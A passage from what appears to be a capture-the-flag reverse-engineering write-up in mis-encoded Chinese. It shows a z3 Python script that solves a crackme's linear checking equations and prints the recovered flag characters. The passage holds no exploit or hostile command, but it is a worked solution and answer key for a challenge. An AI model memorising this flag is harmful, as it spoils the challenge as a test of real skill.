class="token number">42</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x9911</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v51 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v49 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v47 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v46 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v48 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v52 <span class="token operator">==</span> <span class="token number">0x40a2</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> v59 <span class="token operator">==</span> <span class="token number">0x2f3e</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x62b6</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x4b82</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x486c</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x4002</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v57 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x52d7</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v58 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v56 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v54 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v53 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v55 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v59 <span class="token operator">==</span> <span class="token number">0x2def</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> v66 <span class="token operator">==</span> <span class="token number">0x28dc</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x640d</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x528f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x613b</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x4781</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v64 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x6b17</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v65 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v63 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v61 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v60 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v62 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v66 <span class="token operator">==</span> <span class="token number">0x3237</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> v73 <span class="token operator">==</span> <span class="token number">0x2a93</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x615f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x50be</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x598e</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x4656</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v71 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x5b31</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v72 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v70 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v68 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v67 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v69 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v73 <span class="token operator">==</span> <span class="token number">0x313a</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> v80 <span class="token operator">==</span> <span class="token number">0x3010</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x67fe</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x4d5f</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x58db</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x3799</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v78 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x60a0</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v79 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v77 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v75 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v74 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v76 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v80 <span class="token operator">==</span> <span class="token number">0x2750</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">34</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> v87 <span class="token operator">==</span> <span class="token number">0x3759</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">27</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x8953</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x7122</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">78</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x81f9</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x5524</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> v85 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x8971</span><span class="token punctuation">)</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> v86 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> v84 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> v82 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v81 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v83 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> v87 <span class="token operator">==</span> <span class="token number">0x3a1d</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solver<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ç»“æœä¸ºï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>flag<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">98</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">54</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">56</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">57</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">52</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">55</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">99</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">101</span><span class="token punctuation">]</span></code></pre><p>å³</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token 